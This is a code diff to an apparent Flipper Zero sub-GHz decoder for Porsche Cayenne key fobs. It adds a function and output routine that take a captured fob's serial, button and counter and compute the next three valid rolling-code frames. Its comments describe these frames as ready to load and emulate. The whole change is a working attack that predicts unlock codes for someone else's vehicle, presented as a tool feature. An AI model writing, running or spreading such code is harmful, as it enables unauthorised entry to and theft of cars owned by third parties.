@@ -8,6 +8,7 @@
 #define PC_TE_SYNC                3370U
 #define PC_TE_GAP                 5930U
 #define PC_SYNC_MIN               15
+#define PORSCHE_CAYENNE_PREDICT_COUNT 3U
 
 static const SubGhzBlockConst subghz_protocol_porsche_cayenne_const = {
     .te_short = 1680,
@@ -102,6 +103,19 @@ static void porsche_cayenne_compute_frame(
                        ((~cnt_lo >> 2) & 0x03U));
     pkt[6] = (uint8_t)(((a9b & 0x03U) << 6) | ((a9c >> 2) & 0x3CU) | ((~cnt_lo >> 4) & 0x03U));
     pkt[7] = (uint8_t)(((a9b >> 4) & 0x0FU) | ((a9c & 0x0FU) << 4));
+}
+
+// Weak rolling code: the authenticator bytes pkt[4..7] are a pure function of
+// serial/btn/counter (rotate-24 XOR, no secret key), which is why the decoder can
+// brute the counter with the same forward transform. Predicting future codes is
+// therefore exact: re-encode with the absolute counter and read the 64-bit frame.
+// The decoder stores cnt=counter+1 and compute_frame internally does counter+1, so
+// an absolute counter value of cnt_next maps to compute_frame(... cnt_next - 1 ...).
+static uint64_t
+    porsche_cayenne_predict_key(uint32_t serial, uint8_t btn, uint8_t frame_type, uint16_t cnt_next) {
+    uint8_t pkt[8];
+    porsche_cayenne_compute_frame(serial, btn, (uint16_t)(cnt_next - 1), frame_type, pkt);
+    return pp_bytes_to_u64_be(pkt);
 }
 
 static void porsche_cayenne_parse_data(SubGhzProtocolDecoderPorscheCayenne* instance) {
@@ -550,4 +564,19 @@ void subghz_protocol_decoder_porsche_cayenne_get_string(void* context, FuriStrin
         frame_type_name,
         (unsigned long)(instance->generic.data >> 32),
         (unsigned long)(instance->generic.data & 0xFFFFFFFF));
+
+    // Weak rolling code (cleartext-derivable counter, no secret key): predict the
+    // next few frames by re-encoding serial/btn/frame_type with cnt+i via the same
+    // forward transform the decoder inverts. These keys are byte-correct
+    // (authenticator/counter fields recomputed) so they are load/emulate/save-able.
+    // Only meaningful when the counter was recovered (cnt in 1..256).
+    if(instance->generic.cnt != 0) {
+        for(uint16_t i = 1; i <= PORSCHE_CAYENNE_PREDICT_COUNT; i++) {
+            uint16_t cnt_next = (uint16_t)(instance->generic.cnt + i);
+            uint64_t next_key = porsche_cayenne_predict_key(
+                instance->generic.serial & 0xFFFFFF, instance->generic.btn, frame_type, cnt_next);
+            furi_string_cat_printf(
+                output, "\r\nNext+%u:%016llX", (unsigned int)i, (unsigned long long)next_key);
+        }
+    }
 }
